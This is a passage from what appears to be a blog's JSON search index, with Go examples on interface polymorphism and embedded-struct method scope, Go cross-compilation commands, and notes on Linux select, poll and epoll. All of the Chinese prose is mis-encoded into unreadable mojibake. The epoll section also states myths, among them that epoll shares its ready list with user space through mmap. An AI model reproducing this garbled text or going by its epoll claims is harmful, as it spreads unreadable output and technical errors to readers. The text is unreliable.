main\n\nimport \"fmt\"\n\ntype P interface {\n\tSay()\n}\ntype P1 struct{}\ntype P2 struct{}\n\nfunc (p *P1) Say() {\n\tfmt.Println(\"say p1\")\n}\nfunc (p *P2) Say() {\n\tfmt.Println(\"say p2\")\n}\n\nfunc main() {\n\tp1 := &P1{}\n\tp2 := &P2{}\n\n\tvar p P\n\tp = p1\n\tp.Say() // say p1\n\tp = p2\n\tp.Say() // say p2\n}\n```\n\n\n\n# 5. éè¿è¡Œæ—¶å¤šæ€\n\ngo è¯­è¨€ä¸­ï¼Œå½“å­ç±»è°ƒç”¨çˆ¶ç±»æ–¹æ³•æ—¶ï¼Œâ€œä½œç”¨åŸŸâ€å°†è¿›å…¥çˆ¶ç±»çš„ä½œç”¨åŸŸï¼Œçœ‹ä¸è§å­ç±»çš„æ–¹æ³•å­˜åœ¨\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype A struct {\n}\n\nfunc (a *A) ShowA() {\n\tfmt.Println(\"showA\")\n\ta.ShowB()\n}\nfunc (a *A) ShowB() {\n\tfmt.Println(\"showB\")\n}\n\ntype B struct {\n\tA\n}\n\nfunc (b *B) ShowB() {\n\tfmt.Println(\"b showB\")\n}\n\nfunc main() {\n\tb := B{}\n\tb.ShowA()\n}\n\n// showA\n// showB,  not b showB\n```\n\n","tags":["golang"],"categories":["golang"]},{"title":"golangå¤šå¹³å°äº¤å‰ç¼–è¯‘","url":"%2Fp%2F37af4aa1.html","content":"\n\n### cannot execute binary file exec format error\n\næ˜¯å› ä¸ºmacå’Œubuntuçš„äºŒè¿›åˆ¶æ ¼å¼ä¸ä¸€è‡´\n\n\n### é—®é¢˜\n\nGoæ˜¯ä¸€é—¨ç¼–è¯‘å‹è¯­è¨€ï¼Œæ‰€ä»¥åœ¨ä¸åŒå¹³å°ä¸Šï¼Œéœ€è¦ç¼–è¯‘ç”Ÿæˆä¸åŒæ ¼å¼çš„äºŒè¿›åˆ¶åŒ…ã€‚\nç”±äºGo 1.5å¯¹è·¨å¹³å°ç¼–è¯‘æœ‰äº†ä¸€äº›æ”¹è¿›ï¼ŒåŒ…æ‹¬ç»Ÿä¸€äº†ç¼–è¯‘å™¨ã€é“¾æ¥å™¨ç­‰ã€‚\nç¼–è¯‘æ—¶å€™åªéœ€è¦æŒ‡å®šä¸¤ä¸ªå‚æ•°ï¼šGOOSå’ŒGOARCHå³å¯ã€‚\n\n\n<!-- more -->\n\n\n### ç¼–è¯‘åˆ° linux 64bit\n```\n$ GOOS=linux GOARCH=amd64 go build\n```\n### æˆ–è€…å¯ä»¥ä½¿ç”¨ -o é€‰é¡¹æŒ‡å®šç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶åå­—\n```\n$ GOOS=linux GOARCH=amd64 go build -o app.linux\n```\n### ç¼–è¯‘åˆ° linux 32bit\n```\n$ GOOS=linux GOARCH=386 go build\n```\n### ç¼–è¯‘åˆ° windows 64bit\n```\n$ GOOS=windows GOARCH=amd64 go build\n```\n\n### ç¼–è¯‘åˆ° windows 32bit\n```\n$ GOOS=windows GOARCH=386 go build\n```\n\n### ç¼–è¯‘åˆ° Mac OS X 64bit\n```\n$ GOOS=darwin GOARCH=amd64 go build\n```","tags":["golang"],"categories":["golang"]},{"title":"ioå¤šè·¯å¤ç”¨select_poll_epoll","url":"%2Fp%2F457c2d1f.html","content":"\n# 1. åŸºç¡€æ¦‚å¿µ\n\n### 1.1 ç”¨æˆ·æ€å’Œæ ¸å¿ƒæ€\n\nLinuxç³»ç»Ÿä¸­åˆ†ä¸ºæ ¸å¿ƒæ€(Kernel model)å’Œç”¨æˆ·æ€(User model)ï¼ŒCPUä¼šåœ¨ä¸¤ä¸ªmodelä¹‹é—´åˆ‡æ¢ã€‚\n\n+ æ ¸å¿ƒæ€ä»£ç æ‹¥æœ‰å®Œå…¨çš„åº•å±‚èµ„æºæ§åˆ¶æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»»ä½•CPUæŒ‡ä»¤ï¼Œè®¿é—®ä»»ä½•å†…å­˜åœ°å€ï¼Œå…¶å æœ‰çš„å¤„ç†æœºæ˜¯ä¸å…è®¸è¢«æŠ¢å çš„ã€‚å†…æ ¸æ€çš„æŒ‡ä»¤åŒ…æ‹¬ï¼šå¯åŠ¨I/Oï¼Œå†…å­˜æ¸…é›¶ï¼Œä¿®æ”¹ç¨‹åºçŠ¶æ€å­—ï¼Œè®¾ç½®æ—¶é’Ÿï¼Œå…è®¸/ç»ˆæ­¢ä¸­æ–­å’Œåœæœºã€‚å†…æ ¸æ€çš„ç¨‹åºå´©æºƒä¼šå¯¼è‡´PCåœæœºã€‚\n\n+ ç”¨æˆ·æ€æ˜¯ç”¨æˆ·ç¨‹åºèƒ½å¤Ÿä½¿ç”¨çš„æŒ‡ä»¤ï¼Œä¸èƒ½ç›´æ¥è®¿é—®åº•å±‚ç¡¬ä»¶å’Œå†…å­˜åœ°å€ã€‚ç”¨æˆ·æ€è¿è¡Œçš„ç¨‹åºå¿…é¡»å§”æ‰˜ç³»ç»Ÿè°ƒç”¨æ¥è®¿é—®ç¡¬ä»¶å’Œå†…å­˜ã€‚ç”¨æˆ·æ€çš„æŒ‡ä»¤åŒ…æ‹¬ï¼šæ§åˆ¶è½¬ç§»ï¼Œç®—æ•°è¿ç®—ï¼Œå–æ•°æŒ‡ä»¤ï¼Œè®¿ç®¡æŒ‡ä»¤ï¼ˆä½¿ç”¨æˆ·ç¨‹åºä»ç”¨æˆ·æ€é™·å…¥å†…æ ¸æ€ï¼‰ã€‚\n\n<!-- more -->\n\n\n\n### 1.2 ç”¨æˆ·æ€å’Œæ ¸å¿ƒæ€çš„åˆ‡æ¢\n\nç”¨æˆ·æ€åˆ‡æ¢åˆ°æ ¸å¿ƒæ€æœ‰ä¸‰ç§æ–¹å¼ï¼š \n\n+ ç³»ç»Ÿè°ƒç”¨\n\nè¿™æ˜¯ç”¨æˆ·æ€è¿›ç¨‹ä¸»åŠ¨è¦æ±‚åˆ‡æ¢åˆ°å†…æ ¸æ€çš„ä¸€ç§æ–¹å¼ï¼Œç”¨æˆ·æ€è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ç”³è¯·ä½¿ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„æœåŠ¡ç¨‹åºå®Œæˆå·¥ä½œï¼Œæ¯”å¦‚å‰ä¾‹ä¸­fork()å®é™…ä¸Šå°±æ˜¯æ‰§è¡Œäº†ä¸€ä¸ªåˆ›å»ºæ–°è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚è€Œç³»ç»Ÿè°ƒç”¨çš„æœºåˆ¶å…¶æ ¸å¿ƒè¿˜æ˜¯ä½¿ç”¨äº†æ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·ç‰¹åˆ«å¼€æ”¾çš„ä¸€ä¸ªä¸­æ–­æ¥å®ç°ï¼Œä¾‹å¦‚Linuxçš„int 80hä¸­æ–­ã€‚ \n\n+ å¼‚å¸¸\n\nå½“CPUåœ¨æ‰§è¡Œè¿è¡Œåœ¨ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºæ—¶ï¼Œå‘ç”Ÿäº†æŸäº›äº‹å…ˆä¸å¯çŸ¥çš„å¼‚å¸¸ï¼Œè¿™æ—¶ä¼šè§¦å‘ç”±å½“å‰è¿è¡Œè¿›ç¨‹åˆ‡æ¢åˆ°å¤„ç†æ­¤å¼‚å¸¸çš„å†…æ ¸ç›¸å…³ç¨‹åºä¸­ï¼Œä¹Ÿå°±è½¬åˆ°äº†å†…æ ¸æ€ï¼Œæ¯”å¦‚ç¼ºé¡µå¼‚å¸¸ã€‚\n\n+ å¤–å›´è®¾å¤‡çš„ä¸­æ–­\n\nå½“å¤–å›´è®¾å¤‡å®Œæˆç”¨æˆ·è¯·æ±‚çš„æ“ä½œåï¼Œä¼šå‘CPUå‘å‡ºç›¸åº”çš„ä¸­æ–­ä¿¡å·ï¼Œè¿™æ—¶CPUä¼šæš‚åœæ‰§è¡Œä¸‹ä¸€æ¡å³å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤è½¬è€Œå»æ‰§è¡Œä¸ä¸­æ–­ä¿¡å·å¯¹åº”çš„å¤„ç†ç¨‹åºï¼Œå¦‚æœå…ˆå‰æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºï¼Œé‚£ä¹ˆè¿™ä¸ªè½¬æ¢çš„è¿‡ç¨‹è‡ªç„¶ä¹Ÿå°±å‘ç”Ÿäº†ç”±ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢ã€‚æ¯”å¦‚ç¡¬ç›˜è¯»å†™æ“ä½œå®Œæˆï¼Œç³»ç»Ÿä¼šåˆ‡æ¢åˆ°ç¡¬ç›˜è¯»å†™çš„ä¸­æ–­å¤„ç†ç¨‹åºä¸­æ‰§è¡Œåç»­æ“ä½œç­‰ã€‚\n\n\n\n### 1.3 è¿›ç¨‹åˆ‡æ¢\n\nä¸ºäº†æ§åˆ¶è¿›ç¨‹çš„æ‰§è¡Œï¼Œå†…æ ¸å¿…é¡»æœ‰èƒ½åŠ›æŒ‚èµ·æ­£åœ¨CPUä¸Šè¿è¡Œçš„è¿›ç¨‹ï¼Œå¹¶æ¢å¤ä»¥å‰æŒ‚èµ·çš„æŸä¸ªè¿›ç¨‹çš„æ‰§è¡Œã€‚è¿™ç§è¡Œä¸ºè¢«ç§°ä¸ºè¿›ç¨‹åˆ‡æ¢ã€‚å› æ­¤å¯ä»¥è¯´ï¼Œä»»ä½•è¿›ç¨‹éƒ½æ˜¯åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸çš„æ”¯æŒä¸‹è¿è¡Œçš„ï¼Œæ˜¯ä¸å†…æ ¸ç´§å¯†ç›¸å…³çš„ã€‚ä»ä¸€ä¸ªè¿›ç¨‹çš„è¿è¡Œè½¬åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ä¸Šè¿è¡Œï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ç»è¿‡ä¸‹é¢è¿™äº›å˜åŒ–ï¼š\n\n1. ä¿å­˜å¤„ç†æœºä¸Šä¸‹æ–‡ï¼ŒåŒ…æ‹¬ç¨‹åºè®¡æ•°å™¨å’Œå…¶ä»–å¯„å­˜å™¨ã€‚\n\n2. æ›´æ–°PCBä¿¡æ¯ã€‚\n\n3. æŠŠè¿›ç¨‹çš„PCBç§»å…¥ç›¸åº”çš„é˜Ÿåˆ—ï¼Œå¦‚å°±ç»ªã€åœ¨æŸäº‹ä»¶é˜»å¡ç­‰é˜Ÿåˆ—ã€‚\n\n4. é€‰æ‹©å¦ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œï¼Œå¹¶æ›´æ–°å…¶PCBã€‚\n\n5. æ›´æ–°å†…å­˜ç®¡ç†çš„æ•°æ®ç»“æ„ã€‚\n\n6. æ¢å¤å¤„ç†æœºä¸Šä¸‹æ–‡ã€‚\n\n\n\n### 1.4 è¿›ç¨‹é˜»å¡\n\næ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ç”±äºä¸€äº›äº‹æƒ…å‘ç”Ÿï¼Œå¦‚è¯·æ±‚èµ„æºå¤±è´¥ã€ç­‰å¾…æŸç§æ“ä½œå®Œæˆã€æ–°æ•°æ®å°šæœªè¾¾åˆ°æˆ–è€…æ²¡æœ‰æ–°å·¥ä½œåšç­‰ï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œé˜»å¡åŸè¯­ï¼Œä½¿è¿›ç¨‹çŠ¶æ€å˜ä¸ºé˜»å¡çŠ¶æ€ã€‚\n\nå› æ­¤ï¼Œè¿›ç¨‹é˜»å¡æ˜¯è¿›ç¨‹è‡ªèº«çš„ä¸€ç§ä¸»åŠ¨è¡Œä¸ºï¼Œåªæœ‰å¤„äºè¿è¡Œä¸­çš„è¿›ç¨‹æ‰å¯ä»¥å°†è‡ªèº«è½¬åŒ–ä¸ºé˜»å¡çŠ¶æ€ã€‚å½“è¿›ç¨‹è¢«é˜»å¡ï¼Œå®ƒæ˜¯ä¸å ç”¨CPUèµ„æºçš„ã€‚\n\n\n\n# 2. IOå¤šè·¯å¤ç”¨\n\n### 2.1 select \n\n> è°ƒç”¨åé˜»å¡, ç­‰å¾…æ–‡ä»¶æè¿°ç¬¦å°±ç»ªè¿”å›, ç„¶åéå†è·å–\n\n`int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);`\n\nselect å‡½æ•°ç›‘è§†çš„æ–‡ä»¶æè¿°ç¬¦åˆ†3ç±»ï¼Œåˆ†åˆ«æ˜¯writefdsã€readfdsã€å’Œexceptfdsã€‚è°ƒç”¨åselectå‡½æ•°ä¼šé˜»å¡ï¼Œç›´åˆ°æœ‰æè¿°å‰¯å°±ç»ªï¼ˆæœ‰æ•°æ® å¯è¯»ã€å¯å†™ã€æˆ–è€…æœ‰exceptï¼‰ï¼Œæˆ–è€…è¶…æ—¶ï¼ˆtimeoutæŒ‡å®šç­‰å¾…æ—¶é—´ï¼Œå¦‚æœç«‹å³è¿”å›è®¾ä¸ºnullå³å¯ï¼‰ï¼Œå‡½æ•°è¿”å›ã€‚å½“selectå‡½æ•°è¿”å›åï¼Œå¯ä»¥ é€šè¿‡éå†fdsetï¼Œæ¥æ‰¾åˆ°å°±ç»ªçš„æè¿°ç¬¦ã€‚\n\n\n\nå½“ç”¨æˆ·è¿›ç¨‹è°ƒç”¨selectçš„æ—¶å€™ï¼Œselectä¼šå°†éœ€è¦ç›‘æ§çš„ readfds é›†åˆæ‹·è´åˆ°å†…æ ¸ç©ºé—´ï¼ˆå‡è®¾ç›‘æ§çš„ä»…ä»…æ˜¯socketå¯è¯»ï¼‰ï¼Œç„¶åéå†è‡ªå·±ç›‘æ§çš„socket skï¼ŒæŒ¨ä¸ªè°ƒç”¨skçš„pollé€»è¾‘ä»¥ä¾¿æ£€æŸ¥è¯¥skæ˜¯å¦æœ‰å¯è¯»äº‹ä»¶ï¼Œéå†å®Œæ‰€æœ‰çš„skåï¼Œå¦‚æœæ²¡æœ‰ä»»ä½•ä¸€ä¸ªskå¯è¯»ï¼Œé‚£ä¹ˆselectä¼šè°ƒç”¨schedule_timeoutè¿›å…¥scheduleå¾ªç¯ï¼Œä½¿å¾—processè¿›å…¥ç¡çœ ã€‚\n\nå¦‚æœåœ¨timeoutæ—¶é—´å†…æŸä¸ªskä¸Šæœ‰æ•°æ®å¯è¯»äº†ï¼Œæˆ–è€…ç­‰å¾…timeoutäº†ï¼Œåˆ™è°ƒç”¨selectçš„è¿›ç¨‹ä¼šè¢«å”¤é†’ï¼Œæ¥ä¸‹æ¥selectå°±æ˜¯éå†ç›‘æ§çš„ské›†åˆï¼ŒæŒ¨ä¸ªæ”¶é›†å¯è¯»äº‹ä»¶å¹¶è¿”å›ç»™ç”¨æˆ·äº†\n\n1. éœ€è¦æŠŠæ–‡ä»¶æè¿°ç¬¦æ‹·è´åˆ°å†…æ ¸\n2. fdsé›†åˆæœ‰é™åˆ¶ 1024\n3. éå†æ•ˆç‡ä½\n\n### 2.2 poll \n\n> åªè§£é™¤äº†select1024çš„é™åˆ¶\n\n`int poll(struct pollfd *fds, nfds_t nfds, int timeout);`\n\npollå’Œselectéå¸¸ç›¸ä¼¼ï¼Œpollå¹¶æ²¡ç€æ‰‹è§£å†³æ€§èƒ½é—®é¢˜ï¼Œpollåªæ˜¯è§£å†³äº†selectçš„é—®é¢˜ fdsé›†åˆå¤§å°1024é™åˆ¶é—®é¢˜ã€‚æ‰€ä»¥æ˜¯ä¸ªé¸¡è‚‹ã€‚\n\npollæ”¹å˜äº†fdsé›†åˆçš„æè¿°æ–¹å¼ï¼Œä½¿ç”¨äº†pollfdç»“æ„è€Œä¸æ˜¯selectçš„fd_setç»“æ„ï¼Œä½¿å¾—pollæ”¯æŒçš„fdsé›†åˆé™åˆ¶è¿œå¤§äºselectçš„1024ã€‚\n\npollè™½ç„¶è§£å†³äº†fdsé›†åˆå¤§å°1024çš„é™åˆ¶é—®é¢˜ï¼Œä½†æ˜¯ï¼Œå®ƒå¹¶æ²¡æ”¹å˜å¤§é‡æè¿°ç¬¦æ•°ç»„è¢«æ•´ä½“å¤åˆ¶äºç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åœ°å€ç©ºé—´ä¹‹é—´ï¼Œä»¥åŠä¸ªåˆ«æè¿°ç¬¦å°±ç»ªè§¦å‘æ•´ä½“æè¿°ç¬¦é›†åˆçš„éå†çš„ä½æ•ˆé—®é¢˜ã€‚\n\npolléšç€ç›‘æ§çš„socketé›†åˆçš„å¢åŠ æ€§èƒ½çº¿æ€§ä¸‹é™ï¼Œpollä¸é€‚åˆç”¨äºå¤§å¹¶å‘åœºæ™¯ã€‚\n\n\n\n### 2.3 epoll\n\n+ `int epoll_create(int size)ï¼›`\n\n  åˆ›å»ºä¸€ä¸ªepollçš„å¥æŸ„ï¼Œsizeç”¨æ¥å‘Šè¯‰å†…æ ¸è¿™ä¸ªç›‘å¬çš„æ•°ç›®ä¸€å…±æœ‰å¤šå¤§  æ–°ç‰ˆæœ¬ç”¨çº¢é»‘æ ‘,è¿™ä¸ªå‚æ•°æ„ä¹‰ä¸å¤§äº†\n\n+ `int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)ï¼›`\n\n  + epfdï¼šæ˜¯epoll_create()çš„è¿”å›å€¼ã€‚\n\n  + opï¼šè¡¨ç¤ºopæ“ä½œï¼Œåˆ†åˆ«æ·»åŠ ã€åˆ é™¤å’Œä¿®æ”¹å¯¹fdçš„ç›‘å¬äº‹ä»¶ã€‚\n\n    + æ·»åŠ EPOLL_CTL_ADDï¼Œ\n    + åˆ é™¤EPOLL_CTL_DELï¼Œ\n    + ä¿®æ”¹EPOLL_CTL_MODã€‚\n\n  + fdï¼šæ˜¯éœ€è¦ç›‘å¬çš„fdï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰\n\n  + epoll_eventï¼šæ˜¯å‘Šè¯‰å†…æ ¸éœ€è¦ç›‘å¬ä»€ä¹ˆäº‹ï¼Œstruct epoll_eventç»“æ„å¦‚ä¸‹ï¼š\n\n    ```c\n    struct epoll_event {\n      __uint32_t events;  /* Epoll events */\n      epoll_data_t data;  /* User data variable */\n    };\n    ```\n\n    eventså¯ä»¥æ˜¯ä»¥ä¸‹å‡ ä¸ªå®çš„é›†åˆï¼š\n\n    + EPOLLIN ï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å¯ä»¥è¯»ï¼ˆåŒ…æ‹¬å¯¹ç«¯SOCKETæ­£å¸¸å…³é—­ï¼‰ï¼›\n    + EPOLLOUTï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å¯ä»¥å†™ï¼›\n    + EPOLLPRIï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦æœ‰ç´§æ€¥çš„æ•°æ®å¯è¯»ï¼ˆè¿™é‡Œåº”è¯¥è¡¨ç¤ºæœ‰å¸¦å¤–æ•°æ®åˆ°æ¥ï¼‰ï¼›\n    + EPOLLERRï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å‘ç”Ÿé”™è¯¯ï¼›\n    + EPOLLHUPï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦è¢«æŒ‚æ–­ï¼›\n    + EPOLLETï¼š å°†EPOLLè®¾ä¸ºè¾¹ç¼˜è§¦å‘(Edge Triggered)æ¨¡å¼ï¼Œè¿™æ˜¯ç›¸å¯¹äºæ°´å¹³è§¦å‘(Level Triggered)æ¥è¯´çš„ã€‚\n    + EPOLLONESHOTï¼šåªç›‘å¬ä¸€æ¬¡äº‹ä»¶ï¼Œå½“ç›‘å¬å®Œè¿™æ¬¡äº‹ä»¶ä¹‹åï¼Œå¦‚æœè¿˜éœ€è¦ç»§ç»­ç›‘å¬è¿™ä¸ªsocketçš„è¯ï¼Œéœ€è¦å†æ¬¡æŠŠè¿™ä¸ªsocketåŠ å…¥åˆ°EPOLLé˜Ÿåˆ—é‡Œ\n\n\n\n+ `int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);`\n\n  ç­‰å¾…epfdä¸Šçš„ioäº‹ä»¶ï¼Œæœ€å¤šè¿”å›maxeventsä¸ªäº‹ä»¶ã€‚\n\n  å‚æ•°eventsç”¨æ¥ä»å†…æ ¸å¾—åˆ°äº‹ä»¶çš„é›†åˆï¼Œmaxeventså‘Šä¹‹å†…æ ¸è¿™ä¸ªeventsæœ‰å¤šå¤§ï¼Œè¿™ä¸ªmaxeventsçš„å€¼ä¸èƒ½å¤§äºåˆ›å»ºepoll_create()æ—¶çš„size\n\n  å‚æ•°timeoutæ˜¯è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼Œ0ä¼šç«‹å³è¿”å›ï¼Œ-1å°†ä¸ç¡®å®šï¼Œä¹Ÿæœ‰è¯´æ³•è¯´æ˜¯æ°¸ä¹…é˜»å¡ï¼‰ã€‚\n\n  è¯¥å‡½æ•°è¿”å›éœ€è¦å¤„ç†çš„äº‹ä»¶æ•°ç›®ï¼Œå¦‚è¿”å›0è¡¨ç¤ºå·²è¶…æ—¶ã€‚\n\n\n\n# 3. epoll\n\n### 3.1 epollæ‹·è´é—®é¢˜çš„è§£å†³\n\nepollå¼•å…¥äº†epoll_ctlç³»ç»Ÿè°ƒç”¨ï¼Œå°†é«˜é¢‘è°ƒç”¨çš„epoll_waitå’Œä½é¢‘çš„epoll_ctléš”ç¦»å¼€ã€‚åŒæ—¶ï¼Œepoll_ctlé€šè¿‡(EPOLL_CTL_ADDã€EPOLL_CTL_MODã€EPOLL_CTL_DEL)ä¸‰ä¸ªæ“ä½œæ¥åˆ†æ•£å¯¹éœ€è¦ç›‘æ§çš„fdsé›†åˆçš„ä¿®æ”¹ï¼Œåšåˆ°äº†æœ‰å˜åŒ–æ‰å˜æ›´ã€‚\n\nå°†selectæˆ–pollé«˜é¢‘ã€å¤§å—å†…å­˜æ‹·è´(é›†ä¸­å¤„ç†)å˜æˆepoll_ctlçš„ä½é¢‘ã€å°å—å†…å­˜çš„æ‹·è´(åˆ†æ•£å¤„ç†)ï¼Œé¿å…äº†å¤§é‡çš„å†…å­˜æ‹·è´ã€‚\n\n\n\n\nåŒæ—¶ï¼Œå¯¹äºé«˜é¢‘epoll_waitçš„å¯è¯»å°±ç»ªçš„fdé›†åˆè¿”å›çš„æ‹·è´é—®é¢˜ï¼Œepollé€šè¿‡å†…æ ¸ä¸ç”¨æˆ·ç©ºé—´mmap(å†…å­˜æ˜ å°„)åŒä¸€å—å†…å­˜æ¥è§£å†³ã€‚mmapå°†ç”¨æˆ·ç©ºé—´çš„ä¸€å—åœ°å€å’Œå†…æ ¸ç©ºé—´çš„ä¸€å—åœ°å€åŒæ—¶æ˜ å°„åˆ°ç›¸åŒçš„ä¸€å—ç‰©ç†å†…å­˜åœ°å€ï¼ˆä¸ç®¡æ˜¯ç”¨æˆ·ç©ºé—´è¿˜æ˜¯å†…æ ¸ç©ºé—´éƒ½æ˜¯è™šæ‹Ÿåœ°å€ï¼Œæœ€ç»ˆè¦é€šè¿‡åœ°å€æ˜ å°„æ˜ å°„åˆ°ç‰©ç†åœ°å€ï¼‰ï¼Œä½¿å¾—è¿™å—ç‰©ç†å†…å­˜å¯¹å†…æ ¸å’Œå¯¹ç”¨æˆ·å‡å¯è§ï¼Œå‡å°‘ç”¨æˆ·æ€å’Œå†…æ ¸æ€ä¹‹é—´çš„æ•°æ®äº¤æ¢ã€‚\n\n\n\n### 3.2 epollå¾ªç¯é—®é¢˜çš„è§£å†³\n\nepollå¼•å…¥äº†2ä¸ªä¸­é—´å±‚ï¼Œä¸€ä¸ªåŒå‘é“¾è¡¨(ready_list)ï¼Œä¸€ä¸ªå•ç‹¬çš„ç¡çœ é˜Ÿåˆ—(single_epoll_wait_list)ï¼Œ\n\n\n\nepollå·§å¦™çš„å¼•å…¥ä¸€ä¸ªä¸­é—´å±‚è§£å†³äº†å¤§é‡ç›‘æ§socketçš„æ— æ•ˆéå†é—®é¢˜ã€‚epollåœ¨ä¸­é—´å±‚ä¸Šä¸ºæ¯ä¸ªç›‘æ§çš„socketå‡†å¤‡äº†ä¸€ä¸ªå•ç‹¬çš„å›è°ƒå‡½æ•°epoll_callback_skï¼Œè€Œå¯¹äºselect/pollï¼Œæ‰€æœ‰çš„socketéƒ½å…¬ç”¨ä¸€ä¸ªç›¸åŒçš„å›è°ƒå‡½æ•°ã€‚æ­£æ˜¯è¿™ä¸ªå•ç‹¬çš„å›è°ƒepoll_callback_skä½¿å¾—æ¯ä¸ªsocketéƒ½èƒ½å•ç‹¬å¤„ç†è‡ªèº«ï¼Œå½“è‡ªå·±å°±ç»ªçš„æ—¶å€™å°†è‡ªèº«socketæŒ‚å…¥epollçš„ready_listã€‚\n\n\n\nåŒæ—¶ï¼Œepollå¼•å…¥äº†ä¸€ä¸ªç¡çœ é˜Ÿåˆ—single_epoll_wait_listï¼Œåˆ†å‰²äº†ä¸¤ç±»ç¡çœ ç­‰å¾…ã€‚è¿›ç¨‹ä¸å†ç¡çœ åœ¨æ‰€æœ‰çš„socketçš„ç¡çœ é˜Ÿåˆ—ä¸Šï¼Œè€Œæ˜¯ç¡çœ åœ¨epollçš„ç¡çœ é˜Ÿåˆ—ä¸Šï¼Œåœ¨ç­‰å¾…â€ä»»æ„ä¸€ä¸ªsocketå¯è¯»å°±ç»ªâ€äº‹ä»¶ã€‚è€Œä¸­é—´wait_entry_skåˆ™ä»£æ›¿è¿›ç¨‹ç¡çœ åœ¨å…·ä½“çš„socketä¸Šï¼Œå½“socketå°±ç»ªçš„æ—¶å€™ï¼Œå®ƒå°±å¯ä»¥å¤„ç†è‡ªèº«äº†ã€‚\n\n\n\n### 3.3 epoll LT ET\n\nã€€epollå¯¹æ–‡ä»¶æè¿°ç¬¦çš„æ“ä½œæœ‰ä¸¤ç§æ¨¡å¼ï¼šLTï¼ˆæ°´å¹³è§¦å‘ï¼‰å’ŒETï¼ˆè¾¹ç¼˜è§¦å‘ï¼‰ï¼ŒLTæ¨¡å¼æ˜¯é»˜è®¤æ¨¡å¼ã€‚\n\n+ LTæ¨¡å¼ï¼šå½“epoll_waitæ£€æµ‹åˆ°æè¿°ç¬¦äº‹ä»¶å‘ç”Ÿå¹¶å°†æ­¤äº‹ä»¶é€šçŸ¥åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä¸ç«‹å³å¤„ç†è¯¥äº‹ä»¶ã€‚ä¸‹æ¬¡è°ƒç”¨epoll_waitæ—¶ï¼Œä¼šå†æ¬¡å“åº”åº”ç”¨ç¨‹åºå¹¶é€šçŸ¥æ­¤äº‹ä»¶ã€‚\n\n  \n\n  LT(level triggered)æ˜¯ç¼ºçœçš„å·¥ä½œæ–¹å¼ï¼Œå¹¶ä¸”åŒæ—¶æ”¯æŒblockå’Œno-block socket.åœ¨è¿™ç§åšæ³•ä¸­ï¼Œå†…æ ¸å‘Šè¯‰ä½ ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ˜¯å¦å°±ç»ªäº†ï¼Œç„¶åä½ å¯ä»¥å¯¹è¿™ä¸ªå°±ç»ªçš„fdè¿›è¡ŒIOæ“ä½œã€‚å¦‚æœä½ ä¸ä½œä»»ä½•æ“ä½œï¼Œå†…æ ¸è¿˜æ˜¯ä¼šç»§ç»­é€šçŸ¥ä½ çš„ã€‚\n\n  \n\n+ ETæ¨¡å¼ï¼šå½“epoll_waitæ£€æµ‹åˆ°æè¿°ç¬¦äº‹ä»¶å‘ç”Ÿå¹¶å°†æ­¤äº‹ä»¶é€šçŸ¥åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºå¿…é¡»ç«‹å³å¤„ç†è¯¥äº‹ä»¶ã€‚å¦‚æœä¸å¤„ç†ï¼Œä¸‹æ¬¡è°ƒç”¨epoll_waitæ—¶ï¼Œä¸ä¼šå†æ¬¡å“åº”åº”ç”¨ç¨‹åºå¹¶é€šçŸ¥æ­¤äº‹ä»¶ã€‚\n\n  \n\n  ET(è¾¹ç¼˜è§¦å‘)æ˜¯é«˜é€Ÿå·¥ä½œæ–¹å¼ï¼Œåªæ”¯æŒno-block socketã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå½“æè¿°ç¬¦ä»æœªå°±ç»ªå˜ä¸ºå°±ç»ªæ—¶ï¼Œå†…æ ¸é€šè¿‡epollå‘Šè¯‰ä½ ã€‚ç„¶åå®ƒä¼šå‡è®¾ä½ çŸ¥é“æ–‡ä»¶æè¿°ç¬¦å·²ç»å°±ç»ªï¼Œå¹¶ä¸”ä¸ä¼šå†ä¸ºé‚£ä¸ªæ–‡ä»¶æè¿°ç¬¦å‘é€æ›´å¤šçš„å°±ç»ªé€šçŸ¥ï¼Œç›´åˆ°ä½ åšäº†æŸäº›æ“ä½œå¯¼è‡´é‚£ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸å†ä¸ºå°±ç»ªçŠ¶æ€äº†(æ¯”å¦‚ï¼Œä½ åœ¨å‘é€ï¼Œæ¥æ”¶æˆ–è€…æ¥æ”¶è¯·æ±‚ï¼Œæˆ–è€…å‘é€æ¥æ”¶çš„æ•°æ®å°‘äºä¸€å®šé‡æ—¶å¯¼è‡´äº†ä¸€ä¸ªEWOULDBLOCK é”™è¯¯ï¼‰ã€‚\n\n  \n\n  